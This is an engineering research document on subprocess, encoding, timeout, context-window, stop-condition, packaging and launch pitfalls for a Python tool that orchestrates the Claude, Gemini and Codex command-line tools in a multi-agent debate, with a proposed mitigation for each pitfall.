# Pitfalls Research

**Domain:** Subprocess-based multi-CLI orchestration (Python, no API keys)
**Researched:** 2026-05-02
**Confidence:** HIGH (subprocess + cross-platform pitfalls verified against CPython issues, vendor docs, and active GitHub bug reports). MEDIUM for adoption/launch pitfalls (community wisdom, not authoritative).

> Pitfalls are ordered roughly by severity and by how early they bite. Anything CRITICAL bites in v1 — anything ignored becomes "the tool just doesn't work" for some users. The roadmap should bake mitigations directly into v1 phase scaffolding rather than punt them to v2.

---

## Critical Pitfalls

### Pitfall 1: `-p` Flag Argument-Length Death (Windows ~32 KB, Cmd.exe ~8 KB)

**Severity:** CRITICAL

**What goes wrong:**
Passing the entire transcript-as-prompt via `claude -p "<huge string>"` (the proposed v1 approach) silently breaks once the transcript grows. On Windows, `CreateProcess` rejects command lines beyond ~32 767 characters; if launched through `cmd.exe` (typical in many shells / CI), the limit collapses to 8 191. Linux/macOS are looser (`ARG_MAX` ≈ 128 KB–2 MB) but still finite. By turn 5 of a debate, prompts can easily exceed 32 KB.

**Why it happens:**
The author's instinct ("just shell-quote and pass it") works in dev with 1 KB prompts and breaks at 8 KB on the first Windows user's machine. Anthropic's own `claude-agent-sdk-python` shipped with this exact bug ([issue #501](https://github.com/anthropics/claude-agent-sdk-python/issues/501)). The Auto-Claude project hit it too, surfacing as `WinError 206` ([issue #1329](https://github.com/AndyMik90/Auto-Claude/issues/1329)).

**How to avoid:**
- **Never use `-p <prompt>` for the full transcript.** Treat `-p` as a stub argument only, OR avoid it entirely.
- **Preferred path: stdin pipe.** All three CLIs read prompts from stdin: Claude Code's `--bare`/`-p` accepts stdin, Gemini's `gemini -p ""` reads stdin when arg is empty, [Codex 2026 supports `codex exec -` for explicit stdin](https://developers.openai.com/codex/noninteractive). Use `subprocess.run([cli, ...], input=transcript, text=True, encoding="utf-8")`.
- **Fallback: temp file + `--system-prompt-file` / `@file` syntax** for any CLI that supports it (Claude Code added `--system-prompt-file` partly in response to this bug). Adapter knows which mode its CLI supports.
- **Defensive:** measure `len(transcript.encode("utf-8"))` per turn and refuse if > 30 KB on Windows (with a clear error pointing the user at truncation strategy).

**Warning signs:**
`OSError [WinError 206] The filename or extension is too long`, `OSError [Errno 7] Argument list too long` (E2BIG on Linux), or — worst case — silent zero-byte stdout on Windows when the launcher truncates.

**Phase to address:**
**v1 — `BaseAdapter` design**. The abstract `invoke` contract MUST commit to stdin-or-file delivery before any concrete adapter is implemented. Retrofitting later means rewriting every adapter and the orchestrator's transcript handling.

---

### Pitfall 2: `codex exec` Silently Crashes Without a TTY (Active Bug, Versions 0.124.0+)

**Severity:** CRITICAL

**What goes wrong:**
Per [openai/codex issue #19945](https://github.com/openai/codex/issues/19945) (filed April 2026, **still open** as of research date): `codex exec` with longer prompts (≥ 2 KB tested) and no controlling TTY exits with code **0** and **zero bytes** of output. `subprocess.run(["codex", "exec", "..."])` from Python is exactly this case — no parent TTY is inherited. The orchestrator will see "success" and write an empty agent turn into the transcript, producing a confusing dead-air debate.

**Why it happens:**
Codex regression in 0.124.0 (April 24 2026 build). v0.123.0 was fine. The maintainer hasn't shipped a fix yet, so any user on a current Codex install will hit this. Bonus: ungraceful — exit-code-0-with-empty-output is the worst possible failure mode because the orchestrator can't even detect it via return code.

**How to avoid:**
- **Detect empty stdout from any adapter and treat as a hard error.** A successful turn must produce non-empty content; zero bytes always = abort the run with a clear message naming the offending CLI.
- **Allocate a PTY for Codex specifically** on Linux/macOS via `pty.openpty()` or `pexpect.spawn`. Costs portability (Windows has no native PTY — `winpty` / `pywinpty` exists but adds a dep) but is the only verified workaround.
- **Document the version pin** ("known broken on codex >= 0.124.0 < 0.126.0; pin to 0.123.0 or use foreground mode") in the README troubleshooting section.
- **Ship a `--diagnose` subcommand** that runs each CLI with a known-good prompt and reports byte counts + exit codes. Catches this and similar regressions for end-users without forcing them to file issues.

**Warning signs:**
Exit code 0, `len(stdout.strip()) == 0` from one adapter while others work; user reports "Codex never says anything"; CI tests with mocked subprocess pass but real-world tests on macOS/Linux without a terminal fail.

**Phase to address:**
**v1 — adapter test harness**. Every adapter must have an "empty output → error" check from the start. **v2** can add the PTY workaround as a `pty: true` config option on `CodexAdapter`.

---

### Pitfall 3: Encoding Disasters on Windows (cp1252, BOM, Smart Quotes from LLMs)

**Severity:** CRITICAL

**What goes wrong:**
`subprocess.run` on Windows defaults to `locale.getencoding()` which is **cp1252** in most US/EU installs ([CPython issue #105312](https://github.com/python/cpython/issues/105312), [bpo-27179](https://bugs.python.org/issue27179)). LLM output regularly contains:
- Smart quotes (`"`, `"`, `'`, `'`) from training data
- Em dashes (`—`), ellipses (`…`)
- Non-ASCII code identifiers in international snippets
- Occasional BOM (`\ufeff`) at start of output

These are valid UTF-8 but **invalid cp1252 in many byte positions**. Result: `UnicodeDecodeError` mid-run, OR — worse — silent character corruption that pollutes the transcript and confuses the next agent.

**Why it happens:**
Three layers conspire:
1. Python defaults to system codepage on Windows.
2. Anthropic/Google/OpenAI CLIs may emit UTF-8 to stdout regardless (no agreement among the three).
3. Stderr (where rate-limit and auth errors go) often uses the **OEM** codepage on Windows (cp850, cp437) which is yet a third encoding.

**How to avoid:**
- **ALWAYS set `encoding="utf-8", errors="replace"` explicitly** on every `subprocess.run` call. Constraints already note this; enforce via lint or wrapper helper.
- **Strip BOM after decoding:** `output.lstrip("\ufeff")`. Don't rely on `utf-8-sig` because input encoding from Python's side isn't relevant — the BOM lives in the child's stdout.
- **Decode stderr separately with `errors="replace"`** and treat it as best-effort. Never use `stderr=subprocess.STDOUT` (it merges streams with potentially different encodings).
- **Set `PYTHONIOENCODING=utf-8` in the spawned env on Windows** to coax Python-based child CLIs to produce UTF-8 (Codex is Rust, but Anthropic's binary distribution may include a Node wrapper that respects locale).
- **Test with a fixture transcript containing**: `"smart quotes — em dashes…", emoji, BOM, mixed Japanese, Cyrillic`. CI on Windows runner is non-negotiable for this tool.

**Warning signs:**
`UnicodeDecodeError: 'charmap' codec can't decode byte 0x9d in position 4242: character maps to <undefined>` (classic cp1252 vs UTF-8 collision), or transcripts that look like `Hereâ€™s the answer` (cp1252-decoded UTF-8 — mojibake).

**Phase to address:**
**v1 — `BaseAdapter` invoke implementation**. Encoding is the first thing every adapter touches; getting it wrong once propagates everywhere. CI must run on `windows-latest` from day one.

---

### Pitfall 4: Auth State Assumed, Discovered Mid-Run

**Severity:** CRITICAL

**What goes wrong:**
The user's `claude` CLI isn't logged in (token expired, fresh install, OAuth flow incomplete). The orchestrator runs turn 1 → Claude returns an auth error to stdout/stderr → the transcript records "Please run /login" as the agent's contribution → turn 2 (Gemini) sees that text as the previous agent's reply → debate becomes nonsense. Or worse, in CI: rate limits / auth errors are masked because the test mocked subprocess and never hit the real CLI.

**Why it happens:**
- Claude Code authentication errors are runtime exit-1 with text-only error messages, not structured ([code.claude.com/docs/en/errors](https://code.claude.com/docs/en/errors)).
- Each CLI has a *different* status command: Claude Code uses interactive `/status`, Codex has `codex login status` (exits 0 = logged in), Gemini relies on env/cached creds and silently fails in non-interactive mode.
- The differentiator pitch ("no API keys, use existing CLI logins") *means* this is the most common user failure mode. Skip this and ~30% of first-run users will report "tool is broken."

**How to avoid:**
- **Pre-flight check before entering the orchestrator loop.** For each configured adapter:
  - Claude: run `claude -p "ping"` with 5s timeout and a reject-on-empty heuristic; or look for the OAuth config file (`~/.claude/auth.json` or similar — verify path).
  - Codex: run `codex login status` (exits 0 = logged in per docs).
  - Gemini: probe with `gemini -p "ping"` and inspect for known auth-error strings.
- **If any adapter fails pre-flight, abort with a per-adapter remediation message:** "claude: not authenticated — run `claude /login` and try again."
- **Detect auth errors mid-run too** (OAuth tokens can expire between turns) by scanning agent output for known phrases (`Please run /login`, `not authenticated`, `401`, `Resource exhausted`) and aborting the run with the offending CLI named.
- **Ship a `ultra-claude doctor` subcommand** that runs the pre-flight without launching the orchestrator. Mentions of this in the README's troubleshooting section reduce issue volume.

**Warning signs:**
First turn output contains "login", "auth", "401", "credential", "expired"; or run completes in under 200ms (CLIs hitting auth-fail-fast paths return that quickly).

**Phase to address:**
**v1 — orchestrator entry point**. Pre-flight runs before the first `invoke` call. The `doctor` subcommand can be v1 or v2; the inline pre-flight is **non-negotiable for v1**.

---

### Pitfall 5: Hung Subprocesses, No Timeout, Runaway Children

**Severity:** CRITICAL

**What goes wrong:**
A CLI hangs (network stalls, model service slow, prompt tickles an infinite-tool-loop bug, [Gemini -p known to hang in some cases](https://github.com/google-gemini/gemini-cli/issues/19774)). `subprocess.run` without `timeout=` blocks forever. User Ctrl-Cs ultra-claude → the **child** keeps running, holding file locks, consuming subscription quota, even continuing to bill if the user has API billing on their CLI account. On Windows, the orphaned child can't be reaped by ordinary signals.

**Why it happens:**
- New Python developers default to `subprocess.run(cmd)` without timeout.
- On Linux/macOS, `subprocess.kill()` only kills the direct child — descendants (Node spawned by the CLI, browser launched for OAuth, etc.) are orphaned without `os.setsid` + `os.killpg`.
- On Windows, there's no `killpg`. The correct path is `subprocess.Popen(cmd, creationflags=CREATE_NEW_PROCESS_GROUP)` then `taskkill /T /F /PID <pid>` ([cross-platform guide](https://alexandra-zaharia.github.io/posts/kill-subprocess-and-its-children-on-timeout-python/)).
- Pipe buffer deadlock: child writes > 64 KB to stdout while orchestrator hasn't read → both block forever ([CPython bpo-31447](https://bugs.python.org/issue31447), [bpo-13422](https://bugs.python.org/issue13422)).

**How to avoid:**
- **Mandatory `timeout=` on every subprocess call**, configurable per-adapter via `AgentConfig.timeout_seconds` (default 300s = 5 min — enough for slow Gemini, short enough to fail fast).
- **Use `subprocess.run(..., input=transcript, capture_output=True, timeout=N)`** rather than `Popen` + manual read — `run` handles the pipe-buffer deadlock for you (it reads in a thread internally).
- **Cross-platform process-tree kill helper:**
  - POSIX: `Popen(..., start_new_session=True)` then `os.killpg(p.pid, signal.SIGTERM)` on timeout, escalate to `SIGKILL` after 2s grace.
  - Windows: `Popen(..., creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)` then `subprocess.run(["taskkill", "/T", "/F", "/PID", str(p.pid)])`.
- **Always call `.communicate()` with a timeout** if you ever drop to `Popen` for any reason. Never `proc.wait()` without timeout.
- **Wrap orchestrator in a top-level signal handler** so user Ctrl-C triggers cleanup (kill any in-flight child) before exiting.

**Warning signs:**
Test suite hangs in CI; user reports "had to reboot to kill it"; `ps -ef | grep claude` shows orphans after ultra-claude exits.

**Phase to address:**
**v1 — `BaseAdapter.invoke` and orchestrator main loop**. Both timeout AND process-tree kill must land in v1. Half-measures (timeout but no tree kill) leave runaway children — silent quota burn is the worst regression you can ship.

---

### Pitfall 6: Transcript Grows Past Context Window → CLI Truncates Or Errors

**Severity:** HIGH

**What goes wrong:**
v1 spec is "transcript-as-context": each turn re-feeds the full conversation. Claude's context is 200K tokens (~500 KB), Gemini 1M+, Codex/GPT-5 ~128K-272K. A 10-turn debate with code blocks easily reaches 100 KB. By turn 30 (or with code-heavy prompts), one CLI silently truncates older content (degrading reasoning) or hard-errors with a context-window error string that the orchestrator pipes into the next prompt as if it were the agent's reply (compounding garbage).

**Why it happens:**
Every agent re-reads the **entire** transcript on every turn. Token cost grows quadratically: 10 turns of N tokens each = O(10·N) reads but **O(N²) total tokens billed across the run**. The asymmetry is that the *weakest* context window in the trio is the bottleneck — Codex (~128K-272K) caps the whole conversation regardless of Gemini's 1M.

**How to avoid:**
- **Acknowledge the cost in docs.** The `README` should explicitly state "this approach is O(N²) in tokens; recommended for short focused debates (≤ 15 turns)". Setting expectations is cheaper than engineering around it.
- **Per-adapter `max_input_chars` cap** in `AgentConfig` (e.g., 400_000 chars / ~100K tokens for Codex; 800_000 for Claude; 2_000_000 for Gemini). Orchestrator refuses to call an adapter when transcript exceeds its cap.
- **Truncation strategy with explicit fidelity loss flag:**
  1. Always keep: original task file (head) + last N turns (tail).
  2. Drop or summarize: middle turns. v1 can simply elide them with a `[... earlier turns truncated ...]` marker; v2 can summarize via the agent itself.
- **Use [`ConversationSummaryBufferMemory` pattern](https://apxml.com/courses/langchain-production-llm/chapter-3-advanced-memory-management/context-window-management)** if v2 wants smarter truncation: keep last K turns verbatim, summarize older.
- **Detect context-window errors in agent output** (`context_length_exceeded`, `prompt is too long`, `429 Resource exhausted`) and abort the run rather than feeding the error back as a turn.

**Warning signs:**
Run gets slower turn-over-turn; one agent's responses become shorter or generic; transcript contains agent text like "I don't see the original question" (memory fell out of context).

**Phase to address:**
**v1 — orchestrator transcript builder**. Per-adapter `max_input_chars` and naive head+tail truncation are both must-have for v1. Smarter summarization is **v2**.

---

### Pitfall 7: Stop-Condition False Positives (Fabricated "AGREED")

**Severity:** HIGH

**What goes wrong:**
v1 stop conditions are keyword match (`AGREED`, `SHIP IT`) and `max_turns`. Two failure modes:
- **Self-reference:** Agent's reasoning includes "Should I say AGREED here?" or "I am NOT going to say AGREED yet" — both contain the trigger word and stop the debate prematurely.
- **Mention by inclusion:** Agent quotes the previous agent: "You said 'AGREED' — but I disagree." Stops the debate immediately at turn 2.

**Why it happens:**
Naive `if "AGREED" in output: stop` is the obvious implementation and the obvious bug. LLMs are *especially* prone to fabricating consensus tokens because they see them in the system prompt and guess they're expected. Multi-agent debate research calls this **sycophancy / degenerate consensus** — even sophisticated systems collapse to false agreement ([Peacemaker or Troublemaker 2025](https://arxiv.org/html/2509.23055v1), [CONSENSAGENT 2025](https://aclanthology.org/2025.findings-acl.1141/)).

**How to avoid:**
- **Anchor the keyword to a structured marker.** Require it on its own line, optionally inside a sentinel block:
  ```
  ## Decision
  AGREED
  ```
  Match regex like `^## Decision\nAGREED\s*$` (multiline). Casual mentions in prose can't trigger this.
- **Require unanimity over a window.** `AGREED` must appear in the **last N turns from M distinct agents** (e.g., 2 of 3 agents in their most recent turns). Single-agent self-stopping is impossible.
- **Critic role enforced.** Bundle `debate.yaml` with one agent explicitly prompted: "Your role is to find at least one objection. Never say AGREED on the first turn." Removes one source of premature consensus.
- **Document the limitation.** "Stop conditions are heuristic — for production-critical decisions, set `max_turns` low and review the transcript manually."

**Warning signs:**
Debates ending at turn 2; the trigger word appears mid-sentence in the transcript; `max_turns` never being reached in normal runs.

**Phase to address:**
**v1 — stop-condition module**. Structured marker is non-negotiable; unanimity-window is highly recommended. Critic prompt is part of the bundled `debate.yaml` preset.

---

### Pitfall 8: Markdown-in-Markdown Transcript Corruption

**Severity:** HIGH

**What goes wrong:**
Transcript is markdown. Each agent's output (which contains its own markdown — code blocks, headers, lists) gets embedded into the transcript that's then re-fed as the next agent's prompt. Two corruption modes:
- **Fenced code block escape:** Agent A outputs ` ```python\nprint("hi")\n``` `. The orchestrator wraps Agent A's full reply in another ` ``` ` block in the transcript. The inner closing ` ``` ` is now interpreted as the outer block's terminator → all subsequent text is treated as prose, not code, and the rest of the transcript "leaks" into the agent's view as un-indented continuation.
- **Header collision:** Agent A starts a turn with `# My Plan`. The orchestrator also uses `# Turn N: agent-name` for turn markers. The agent's `#` polluts the turn structure → the next agent can't tell where one turn ended and another began.

**Why it happens:**
Naive string concatenation: `transcript += f"## Turn {n}: {agent}\n\n{output}\n\n"`. CommonMark only matches a fenced code block by character count and type ([Python-Markdown docs](https://python-markdown.github.io/extensions/fenced_code_blocks/)) — three backticks inside three backticks closes the outer block. There is no nesting in standard markdown.

**How to avoid:**
- **Use 4+ backticks for the orchestrator's wrapping fences** if you wrap agent output in code blocks. CommonMark allows arbitrary backtick counts, and the closing fence must match the opening count.
- **Better: don't wrap.** Use prefixed turn markers that don't conflict with markdown:
  ```
  --- TURN 3 (architect) ---
  <agent output as-is>
  --- END TURN 3 ---
  ```
  Three-dash thematic breaks are markdown-safe and can't be accidentally generated by an agent producing prose.
- **Strip leading BOM and trailing whitespace from each agent output** before embedding (see encoding pitfall above).
- **Prefix agent-emitted headers** when re-feeding. A simple `re.sub(r'^(#+)', r'>\1', output, flags=re.M)` quotes their headers so they don't compete with structural markers.

**Warning signs:**
Transcript file looks fine in a text editor but renders weirdly in a markdown viewer; agents start outputting "I don't see what came before" mid-debate; later turns reference text from earlier turns garbled.

**Phase to address:**
**v1 — transcript writer module**. Pick the format ONCE in v1; changing it later breaks every existing transcript file users have saved.

---

## High Pitfalls

### Pitfall 9: CLI Version Drift Breaks Adapters Silently

**Severity:** HIGH

**What goes wrong:**
Anthropic ships `claude` v3 with a renamed flag (e.g., `--prompt` becomes `--input`, or `-p` removed in favor of `--system-prompt-file`). Existing ultra-claude installs break overnight. Recent precedent: [Gemini CLI v0.34.0+ changed --prompt flag conflict behavior](https://github.com/paperclipai/paperclip/issues/2907); [Claude Code added --bare](https://code.claude.com/docs/en/changelog) recently as a non-breaking augmentation but it could have been breaking.

**Why it happens:**
Three CLIs from three independent vendors with three independent release schedules and no commitment to backward-compat for `-p`-style flags. The `claude` CLI in particular has shipped multiple flag changes in 2025-2026.

**How to avoid:**
- **Pin a known-good version range per adapter** in docs (e.g., "tested with `claude >= 2.1.0, < 2.3.0`"). README troubleshooting section.
- **Capture CLI `--version` in pre-flight** and warn (don't fail) on unrecognized versions: `WARN: claude version 3.0.0 is newer than the latest tested (2.2.x). May misbehave.`
- **Adapter test fixtures store recorded CLI outputs** so a CI smoke test catches "new CLI version produces different output format" within a day.
- **Versioned adapter classes** are over-engineered for v1 — defer. But the abstract `BaseAdapter` should make the per-CLI version negotiation a future-proof extension point (e.g., `class ClaudeAdapterV2(BaseAdapter): ...`).
- **Quick-fix mechanism** for users: `AgentConfig.command_template: "claude {flags} -p {prompt}"` so a user with a broken-by-update CLI can override the invocation without waiting for a release.

**Warning signs:**
Issue tracker fills with "doesn't work after I updated my CLI"; users reporting works-on-old-version, not-on-new-version with same ultra-claude version.

**Phase to address:**
**v2 — version detection and overridable command templates**. v1 ships with hardcoded invocations and a clearly documented version compatibility matrix.

---

### Pitfall 10: Rate-Limit Errors Bubbled Into the Transcript

**Severity:** HIGH

**What goes wrong:**
User's Claude Pro plan hits its [5-hour rolling rate limit](https://www.truefoundry.com/blog/claude-code-limits-explained) (45 messages every 5 hours on Pro). `claude -p` returns an error like "Rate limit exceeded — try again in 47 minutes" to stdout/stderr. Orchestrator naively appends that as turn 4's output → turn 5 (Gemini) sees the rate-limit text as the previous agent's contribution → debate continues with nonsensical context. Quota also burns Codex's quota and Gemini's quota concurrently as the bad debate proceeds.

**Why it happens:**
- The differentiator (no API keys → use subscription) means **subscription-tier rate limits are the user's actual constraint**, not API token cost.
- All three CLIs return rate-limit messages as text to stdout/stderr with non-zero exit codes — but the exit codes vary, and the wording varies, and the orchestrator must distinguish "real reply" from "error masquerading as reply".

**How to avoid:**
- **Detect known rate-limit / quota strings BEFORE recording the turn:**
  - Claude: `rate.{0,30}limit`, `5-hour`, `usage limit`, `Please wait`
  - Gemini: `429`, `Resource exhausted`, `quota`
  - Codex: `rate.{0,30}limit`, `quota`, `usage cap`
- **Detect non-zero exit codes** as fatal (don't record the turn). Combined with the empty-output check from Pitfall 2, this catches most failure modes.
- **Abort the entire run on rate-limit detection** with a clear message: "Claude rate-limited until 14:32 UTC. Run aborted at turn 4 of 10. Resume after the limit window."
- **Optional: configurable retry-with-backoff per adapter** (`AgentConfig.retry_on_rate_limit: true, max_wait_seconds: 60`). Users who care about completion will set it; users who care about cost will leave it off.

**Warning signs:**
Transcript contains the literal string "rate limit" or "429"; one agent's turn is unusually short and ends with a colon; subsequent agents repeatedly say "I don't understand the previous reply."

**Phase to address:**
**v1 — orchestrator response handler**. Rate-limit detection is critical because the user paid for the CLI subscriptions — wasting quota on bad runs is the inverse of the value prop.

---

### Pitfall 11: Cost Asymmetry Across Agents (Hidden Spend)

**Severity:** MEDIUM

**What goes wrong:**
Claude Code is on Sonnet 4.5; Gemini CLI is on Pro; Codex on GPT-5.3. All three plans have different definitions of "a message" and different message-count vs token-count quotas. A 3-agent debate with 10 turns uses ~3.3 messages per agent, but for Claude that's 7% of a Pro plan's 5-hour budget, while for Gemini it might be 0.3% of the daily quota. **User has no visibility** into which CLI is burning their subscription faster.

**Why it happens:**
- Author lacks tooling to compare cost across CLIs.
- The CLIs themselves don't expose per-call cost in non-interactive mode (Claude's `/usage` is interactive-only).
- Multi-agent frameworks that DO expose cost (LangGraph etc.) are API-key based, where cost is uniformly tokens-out * price-per-token.

**How to avoke:**
- **Print per-agent invocation count and elapsed time at end-of-run.** Cheap, useful, no parsing needed.
- **Document the asymmetry** in README: "Claude Pro burns ~2 messages per turn here. With 3 agents and 10 turns, expect ~7% of your 5-hour Claude budget." Sets expectations.
- **`--budget` flag for v2:** abort if estimated message count exceeds N. v1 can ship without this; v2 adds it once user feedback identifies how to estimate.
- **Per-adapter `max_invocations_per_run`** in config gives users a hard cap.

**Warning signs:**
First user issues like "ran one debate and used my whole Claude budget"; user requests "can we tell which agent ran how many times?"

**Phase to address:**
**v1 — orchestrator end-of-run summary**. Even a one-line `Run summary: 4 turns claude, 3 turns gemini, 3 turns codex; 247s total` is a 10x improvement over silent. Real budget tracking is **v2**.

---

### Pitfall 12: Multi-Agent Off-Task Drift (Long Debates)

**Severity:** MEDIUM

**What goes wrong:**
By turn 8-10, agents wander off the original task. They start debating tangential points raised in turn 5 rather than the question in turn 0. Research on [problem drift in multi-agent debate](https://arxiv.org/html/2502.19559v3) measured drift rates of **76-89% on generative tasks** by mid-debate. The user gets a long transcript that's eloquent but useless for their actual question.

**Why it happens:**
- The prompt format for turn N is the entire transcript, and the original task file (turn 0) becomes a tinier and tinier fraction of the agent's input as turns accumulate.
- Without re-anchoring, the agent's "current focus" reverts to whatever was most recently said.
- Each agent has its own conversational momentum from its own prior turn → the system as a whole has no coordinator.

**How to avoid:**
- **Always re-state the original task in the prompt header** for every turn:
  ```
  --- ORIGINAL TASK ---
  <task file content>
  --- DEBATE SO FAR ---
  <transcript>
  --- YOUR TURN ---
  <agent name>, please respond.
  ```
  This is "[goal persistence](https://arxiv.org/html/2601.04170)" / "anchoring" pattern from the literature.
- **Agent-specific role prompt re-injected each turn.** Critic stays critic, architect stays architect, even on turn 9.
- **Limit `max_turns` to a sensible default (10)** and document why. Most useful debates resolve in 4-6 turns.

**Warning signs:**
Late-turn outputs don't reference the original task; agents quote each other from turns 5+ but ignore turn 0; user feedback "the debate forgot what I asked."

**Phase to address:**
**v1 — orchestrator prompt builder**. Goal-persistence template should be the default, not opt-in.

---

### Pitfall 13: One Agent Dominates / Never Defers

**Severity:** MEDIUM

**What goes wrong:**
Default round-robin (v1) is symmetric, but agent personalities aren't. The architect agent might consistently produce 3000-token replies with substantial new analysis, while the implementer agent produces 200-token agreements. The debate's apparent quality is dominated by one voice; the others contribute noise. Users report "Why did I bother with three agents?"

**Why it happens:**
- LLMs have inherent verbosity asymmetry — Opus tends to write more than Codex unless prompted otherwise.
- Round-robin treats all turns as equal, so a 10-turn debate gives 3 turns to each agent regardless of contribution density.
- The bundled `debate.yaml` system prompts may not equalize personality.

**How to avoid:**
- **Calibrate the bundled `debate.yaml` system prompts.** Architect: "Be concise and specific." Critic: "Find at least one concrete objection." Implementer: "Focus on what would actually be coded." Test in real runs and tune.
- **Per-agent `max_output_chars`** (soft cap with truncation, hard cap with abort). Not perfect but helps.
- **Document the limitation.** "Agents have different verbosity baselines — adjust system prompts in your config to balance."
- **`speaker_chooses` mode (v2)** lets the previous agent pick who replies next, naturally giving quieter agents space when topics suit them.

**Warning signs:**
One agent's turns are >5x longer than the others; user feedback "the debate was just <agent X> with everyone else nodding."

**Phase to address:**
**v1 — bundled `debate.yaml` preset tuning**. v2 ships `speaker_chooses` for users who need finer control.

---

## Distribution & Community Pitfalls

### Pitfall 14: PyPI Name Collision / Squat / Confusion

**Severity:** MEDIUM (verified — currently free)

**What goes wrong:**
- Author tags v0.1.0 → `twine upload` fails: name taken by an unrelated 3-line package squat.
- Worse: name is taken by something Anthropic-affiliated (Anthropic ships an `anthropic` package; collision with `ultra-*` Anthropic-trademarked product names is plausible).
- Worse still: typosquatter snipes `ultraclaude` (no dash) or `ultra_claude` after author publishes `ultra-claude`. Pip [normalizes dashes and underscores](https://snyk.io/articles/security-risks-with-python-package-naming-convention-typosquatting-and/) so they install the same package — but typosquatters can register both stylings.

**Why it happens:**
PyPI names are first-come-first-served and free to register. Squatters scan trending GitHub repos and pre-register names.

**How to avoid:**
- **Verified 2026-05-02:** `https://pypi.org/simple/ultra-claude/` returns 404 and `https://pypi.org/project/ultra-claude/` shows no project — name is **available**.
- **Reserve immediately.** Even before v0.1.0 is ready, push a 0.0.1 stub with just a README pointing at the GitHub repo. Locks the name.
- **Reserve aliases:** also push `ultraclaude` (no dash) and consider `ultra_claude` (hyphen-vs-underscore) — at minimum register them as redirect-stubs to prevent squatting.
- **Trademark check:** brief search confirms "Claude" is Anthropic-trademarked. "ultra-claude" risks a takedown if Anthropic considers it confusing. **MITIGATION:** make the README's first paragraph crystal-clear: "Independent OSS project. Not affiliated with Anthropic." Reduces (but doesn't eliminate) trademark risk. Consider proactive outreach to Anthropic dev-rel.

**Warning signs:**
`twine upload` fails with `400 The name '...' is too similar to an existing project`; trademark notice from Anthropic legal.

**Phase to address:**
**v1 — pre-flight before any code is written**. Reserve the name on PyPI day 1; add the disclaimer to README day 1.

---

### Pitfall 15: README Without a GIF Gets No Stars

**Severity:** MEDIUM

**What goes wrong:**
GitHub stars correlate strongly with first-impression visuals. A wall of text README — even with a good demo command — gets ~10x fewer stars than the same project with a 6-second GIF showing agents debating in real time. [Industry data](https://www.star-history.com/blog/playbook-for-more-github-stars): "GIF or short video demo — worth 10x more than text." Show HN traffic dies in a single news cycle (~24 hours); without a hook, the chance is gone.

**Why it happens:**
- First-time OSS authors think the README "explains" the project; it actually has to *sell* it.
- Recording an asciinema/GIF feels like polish; it's actually the hero asset.
- The PROJECT.md note "demo strategy: failing test → ultra-claude run → test passes" is exactly right but the GIF doesn't make itself.

**How to avoid:**
- **Block v0.1.0 release on the GIF.** PROJECT.md already lists "GIF placeholder" — replace before tagging, not after.
- **Use `vhs` or `asciinema` + `agg`** for terminal recordings. Both are reproducible from a script (re-record after demo polish).
- **Demo script: 60 seconds max.** Show: terminal with failing test → `ultra-claude run task.md` → 3 agents each take a turn (visible via colors/labels) → final consensus → test passes. Tight cuts; trim long turns.
- **Multiple GIFs in README:** one hero GIF at the top, one architecture diagram further down.
- **Don't rely on Show HN being the only launch channel.** Reddit (`r/LocalLLaMA`, `r/ClaudeAI`, `r/ChatGPTCoding`) and X have different audiences and timing; cross-post over a week, not all at once.

**Warning signs:**
v0.1.0 ready to ship but no GIF; README pull request that says "TODO: GIF"; Show HN post drafted that shows install commands but no visual.

**Phase to address:**
**v1 — release blocker for v0.1.0**.

---

### Pitfall 16: Show HN Posted at Wrong Time = Dead On Arrival

**Severity:** MEDIUM

**What goes wrong:**
First-time OSS authors post Show HN at 3am their local time on a Saturday. The post falls off the front page within 90 minutes with 4 votes. [Rule of thumb](https://dev.to/dfarrell/how-to-crush-your-hacker-news-launch-10jk): early week (Mon–Wed), early-to-mid morning US Eastern time, with the author actively engaging in comments for the first 2 hours.

**Why it happens:**
HN ranking heavily weights early engagement. A post that gets 5 votes in the first 30 min may stay on /newest forever; a post that gets 30 votes in the first 30 min hits the front page.

**How to avoid:**
- **Post Tuesday or Wednesday, 8-10am US Eastern Time.** Avoid Friday afternoon, weekends.
- **Have a draft post-and-reply written in advance.** First reply (from the author) goes up within 5 min of submission, explaining "why I built this" and the tech stack.
- **Pre-warm 2-3 HN-using friends** to comment with substantive questions in the first hour (NOT to upvote — HN detects vote-rings).
- **Title formula:** "Show HN: ultra-claude – orchestrate Claude/Gemini/Codex CLIs in a single transcript". 70 chars or fewer. Don't be cute; describe what it is.
- **Have the GIF on the README before submitting** (from Pitfall 15). Most HN clicks go straight to the repo, not the linked URL.

**Warning signs:**
"Going to ship Friday night and post Saturday" plan; submitted at midnight; no friends warned in advance.

**Phase to address:**
**v2 — promotion plan**. Don't fast-track Show HN to v1; ship v1 quietly to PyPI, polish docs based on early-adopter feedback, **then** Show HN once you have a couple of real-user-quotable transcripts.

---

### Pitfall 17: License Confusion (MIT + Bundled Deps)

**Severity:** LOW

**What goes wrong:**
MIT for the project itself is fine. But if v2 bundles or vendors any GPL/AGPL-licensed code (e.g., a pty library, a markdown parser), the license matrix gets murky. A user files an issue: "Are you sure you can ship this under MIT given dep X?"

**Why it happens:**
First-time OSS authors don't audit transitive dep licenses.

**How to avoid:**
- **`pip install pip-licenses` and run on every release.** Spot-check that all deps are MIT/BSD/Apache/PSF. Reject GPL/AGPL deps unless absolutely necessary.
- **Current planned deps are safe:** Pydantic (MIT), PyYAML (MIT), Click (BSD-3-Clause), all permissive.
- **If you ever vendor (copy code into the repo):** add the original license file alongside.
- **Don't relicense.** The MIT license note in PROJECT.md is correct; stick with it.

**Warning signs:**
Adding a new dep without checking its license; user issue asking about license compatibility.

**Phase to address:**
**v2 — dep audit before any added integrations**. v1 deps are fine.

---

### Pitfall 18: PyPI Trusted Publishing Setup Gotchas

**Severity:** LOW

**What goes wrong:**
v2 plans GitHub Actions auto-publish on tag. The Trusted Publishing OIDC setup has [several common failure modes](https://docs.pypi.org/trusted-publishers/troubleshooting/):
- Forgetting `id-token: write` permission on the workflow → `invalid-publisher` error.
- Workflow file path mismatch between PyPI config and actual file.
- Building and publishing in the same job (security antipattern).
- Publishing before adding the trusted publisher to PyPI (chicken-and-egg).

**Why it happens:**
First-time setup, multiple steps in sequence, error messages aren't always clear about which side has the misconfiguration.

**How to avoid:**
- **For v1: just `twine upload` manually.** PROJECT.md already correctly defers GH Actions to v2.
- **For v2: follow [PyPI's docs exactly](https://docs.pypi.org/trusted-publishers/using-a-publisher/)**, especially the two-job pattern (build job + publish job).
- **Test on TestPyPI first.** TestPyPI supports the same OIDC flow; debug there before touching real PyPI.
